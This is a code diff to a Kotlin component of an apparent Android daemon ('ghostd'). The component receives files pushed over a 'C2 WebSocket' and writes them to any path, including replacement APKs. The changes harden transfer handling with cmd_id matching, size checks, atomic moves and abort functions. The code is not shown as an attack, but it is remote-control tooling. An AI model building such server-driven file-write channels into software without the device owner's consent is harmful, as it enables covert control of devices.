@@ -3,6 +3,9 @@ package com.tg.ghostd
 import org.json.JSONObject
 import java.io.File
 import java.io.FileOutputStream
+import java.nio.file.AtomicMoveNotSupportedException
+import java.nio.file.Files
+import java.nio.file.StandardCopyOption
 import java.security.MessageDigest
 import java.util.concurrent.CountDownLatch
 
@@ -11,8 +14,8 @@ import java.util.concurrent.CountDownLatch
  * by the server over the C2 WebSocket and writes it to storage.
  *
  * Flow: the server sends cmd {"action":"files","args":["put","<dest>"]};
- * the command handler starts a transfer ([receive]) and BLOCKS until the
- * server's binary frames arrive (MediaBus framing: JSON header + b'\n' +
+ * the command handler prepares a transfer ([prepare]) on the WebSocket thread
+ * and BLOCKS on a worker ([await]) until the server's binary frames arrive (MediaBus framing: JSON header + b'\n' +
  * payload, header type "file_chunk" carries dest path + total len, final
  * "file_end" completes it — as text or as an empty framed binary message).
  * Returns bytes written + sha256 (and verifies sha256 when the server sent
@@ -31,7 +34,7 @@ object FileReceiver {
      *  timeout, socket drop, daemon restart). Without this the receiver slot
      *  stays "in progress" forever and every later `files put` is refused,
      *  which is exactly what wedged pushes after an interrupted update. */
-    private const val IDLE_TIMEOUT_MS = 90_000L
+    private const val IDLE_TIMEOUT_MS = 180_000L
 
     /** A transfer idle this long is dead: a new push may reclaim the slot. */
     private const val STALE_MS = 45_000L
@@ -39,7 +42,11 @@ object FileReceiver {
     private val lock = Any()
     private var pending: Transfer? = null
 
-    class Transfer internal constructor(val path: String) {
+    class Transfer internal constructor(
+        val path: String,
+        val cmdId: String,
+        internal val owner: Any?
+    ) {
         internal val latch = CountDownLatch(1)
         internal val temp = File(path + PART_SUFFIX)
         internal var out: FileOutputStream? = null
@@ -52,10 +59,17 @@ object FileReceiver {
         internal val digest = MessageDigest.getInstance("SHA-256")
     }
 
-    /** Called by the command handler for `files put <path>`; blocks. */
-    fun receive(path: String): JSONObject {
+    /**
+     * Create the receive slot BEFORE the WebSocket callback returns.
+     *
+     * The server sends `files put` and immediately streams binary frames. If
+     * slot creation is left to the worker thread, early chunks and even
+     * file_end can be processed while pending==null and are lost forever.
+     * CommandHandler therefore calls this synchronously on the WebSocket
+     * thread, then only [await] runs on the worker.
+     */
+    fun prepare(path: String, cmdId: String, owner: Any?): Transfer {
         if (path.isBlank()) throw Exception("files put: missing destination path")
-        val t: Transfer
         synchronized(lock) {
             pending?.let { stale ->
                 val idle = System.currentTimeMillis() - stale.lastActivity
@@ -66,12 +80,17 @@ object FileReceiver {
                 // the slot instead of refusing every later transfer forever.
                 failLocked(stale, "superseded after ${idle / 1000}s with no data")
             }
-            t = Transfer(path)
+            val t = Transfer(path, cmdId, owner)
             val parent = File(path).parentFile
             if (parent != null && !parent.exists()) parent.mkdirs()
             t.out = FileOutputStream(t.temp)
             pending = t
+            return t
         }
+    }
+
+    /** Wait for a prepared transfer; safe to call after file_end arrived. */
+    fun await(t: Transfer): JSONObject {
         val started = System.currentTimeMillis()
         while (true) {
             val ok = try {
@@ -79,7 +98,7 @@ object FileReceiver {
             } catch (_: InterruptedException) {
                 Thread.currentThread().interrupt()
                 fail(t, "interrupted")
-                false
+                break
             }
             if (ok) break
             val now = System.currentTimeMillis()
@@ -116,14 +135,25 @@ object FileReceiver {
             // Cross-wire guard: a server-side push whose `files put` was
             // rejected still streams chunks; they must NOT land in an
             // unrelated in-flight transfer (seen live: ghosta bytes renamed
-            // over ghostd.apk). Chunk headers carry the intended path.
-            val chunkPath = header.optString("path", "")
-            if (chunkPath.isNotEmpty() && chunkPath != t.path) return
+            // over ghostd.apk). Chunk headers carry the intended path+cmd_id.
+            if (header.optString("path") != t.path) return
+            if (header.optString("cmd_id") != t.cmdId) return
             t.lastActivity = System.currentTimeMillis()
             try {
                 val tot = header.optLong("total", -1)
-                if (tot > 0) t.total = tot
-                t.out?.write(payload)
+                if (tot > 0) {
+                    if (t.total > 0 && t.total != tot) {
+                        failLocked(t, "total changed mid-transfer: was ${t.total}, got $tot")
+                        return
+                    }
+                    t.total = tot
+                }
+                val out = t.out
+                if (out == null) {
+                    failLocked(t, "stream closed")
+                    return
+                }
+                out.write(payload)
                 t.digest.update(payload)
                 t.written += payload.size
                 t.chunks++
@@ -138,11 +168,22 @@ object FileReceiver {
         synchronized(lock) {
             val t = pending ?: return
             if (t.error != null) return
-            // Cross-wire guard (see onChunk): only accept file_end for OUR path.
-            val endPath = header.optString("path", header.optString("dest", ""))
-            if (endPath.isNotEmpty() && endPath != t.path) return
+            // Cross-wire guard (see onChunk): only accept file_end for OUR
+            // exact path and cmd_id.
+            if (header.optString("path") != t.path) return
+            if (header.optString("cmd_id") != t.cmdId) return
             if (t.total > 0 && t.written != t.total) {
                 failLocked(t, "size mismatch: got ${t.written} of ${t.total} bytes")
+                return
+            }
+            val endBytes = header.optLong("bytes", -1)
+            if (endBytes >= 0 && endBytes != t.written) {
+                failLocked(t, "file_end bytes mismatch: got ${t.written} of $endBytes bytes")
+                return
+            }
+            val endChunks = header.optLong("chunks", -1)
+            if (endChunks >= 0 && endChunks != t.chunks) {
+                failLocked(t, "file_end chunks mismatch: got ${t.chunks} of $endChunks chunks")
                 return
             }
             val expected = header.optString("sha256")
@@ -153,9 +194,24 @@ object FileReceiver {
             }
             closeStream(t)
             val dest = File(t.path)
-            if (dest.exists()) dest.delete()
-            if (!t.temp.renameTo(dest)) {
-                failLocked(t, "rename to ${t.path} failed")
+            try {
+                Files.move(
+                    t.temp.toPath(), dest.toPath(),
+                    StandardCopyOption.ATOMIC_MOVE,
+                    StandardCopyOption.REPLACE_EXISTING
+                )
+            } catch (_: AtomicMoveNotSupportedException) {
+                try {
+                    Files.move(
+                        t.temp.toPath(), dest.toPath(),
+                        StandardCopyOption.REPLACE_EXISTING
+                    )
+                } catch (e: Exception) {
+                    failLocked(t, "rename to ${t.path} failed: ${e.message}")
+                    return
+                }
+            } catch (e: Exception) {
+                failLocked(t, "rename to ${t.path} failed: ${e.message}")
                 return
             }
             t.sha256 = got
@@ -165,6 +221,36 @@ object FileReceiver {
     }
 
     // ---------------------------------------------------------- internal
+
+    /**
+     * Drop any half-received transfer (called on kick/restart and by
+     * `files abort`). Prevents a dead server-side push from blocking every
+     * later upload with "file transfer already in progress".
+     */
+    fun abortAll(reason: String): JSONObject {
+        var aborted = false
+        synchronized(lock) {
+            val t = pending
+            if (t != null) {
+                failLocked(t, "aborted: $reason")
+                aborted = true
+            }
+        }
+        return JSONObject().put("ok", true).put("aborted", aborted)
+    }
+
+    /** Abort only the transfer owned by [owner] (e.g. one WebSocket). */
+    fun abortOwner(owner: Any?, reason: String): JSONObject {
+        var aborted = false
+        synchronized(lock) {
+            val t = pending
+            if (t != null && t.owner === owner) {
+                failLocked(t, "aborted: $reason")
+                aborted = true
+            }
+        }
+        return JSONObject().put("ok", true).put("aborted", aborted)
+    }
 
     private fun fail(t: Transfer, msg: String) {
         synchronized(lock) { failLocked(t, msg) }
